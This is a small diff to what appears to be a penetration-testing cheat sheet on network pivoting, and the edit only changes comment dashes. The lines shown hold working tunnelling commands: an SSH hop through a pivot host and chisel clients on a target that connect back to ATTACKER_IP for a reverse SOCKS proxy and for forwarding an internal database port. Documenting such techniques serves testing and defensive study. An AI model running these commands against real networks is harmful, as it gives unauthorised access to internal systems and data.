@@ -176,10 +176,10 @@ ssh -o ProxyCommand="ssh -W %h:%p user@pivot1" user@final_target
 # Attacker (server)
 chisel server --reverse --port 8080
 
-# Target (client) -- reverse SOCKS proxy
+# Target (client) - reverse SOCKS proxy
 chisel client ATTACKER_IP:8080 R:socks
 
-# Target (client) -- forward specific port
+# Target (client) - forward specific port
 chisel client ATTACKER_IP:8080 R:3306:internal_db:3306
 ```
 
